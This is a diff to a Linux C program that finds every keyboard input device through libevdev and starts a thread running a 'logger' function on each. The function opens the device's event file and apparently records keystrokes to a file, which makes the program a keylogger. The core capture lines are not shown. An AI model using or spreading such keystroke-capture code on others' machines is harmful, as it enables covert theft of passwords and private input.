@@ -1,6 +1,8 @@
 #include <libevdev/libevdev.h>
+#include <stdlib.h>
 #include <ctype.h> 
 #include <stdbool.h>
+#include <pthread.h>
 #include <linux/input.h>
 #include <fcntl.h>
 #include <string.h>
@@ -145,17 +147,7 @@ int get_kb(char list[20][PATH_MAX], int list_size){
   return i;
 }
 
-
-
-int main(){
-  char list[20][PATH_MAX];
-  int list_size = sizeof(list)/sizeof(list[0]);
-  int size = get_kb(list, list_size);
-
-  for(int i = 0; i < size; i++){
-    printf("Keyboard: %s\n", list[i]);
-  }
-  /*
+void* logger(void* kb_path){
   //open up the kb input event file
   int fd = open(kb_path, O_RDONLY);
 
@@ -215,5 +207,28 @@ int main(){
   // Close the file
   close(fd);
   fclose(fptr); 
-  */
+
+  return NULL;
+}
+
+
+int main(){
+  char list[20][PATH_MAX];
+  int list_size = sizeof(list)/sizeof(list[0]);
+  int size = get_kb(list, list_size);
+
+  pthread_t *threads = malloc(size * sizeof(pthread_t));
+  
+  for(int i = 0; i < size; i++){
+    pthread_create(&threads[i], NULL, logger, list[i]);
+    printf("Keyboard: %s\n", list[i]);
+  }
+
+  //wait for threads to finish
+  for(int i = 0; i < size; i++){
+    pthread_join(threads[i], NULL);
+  }
+
+  free(threads);
+  return 0;
 }
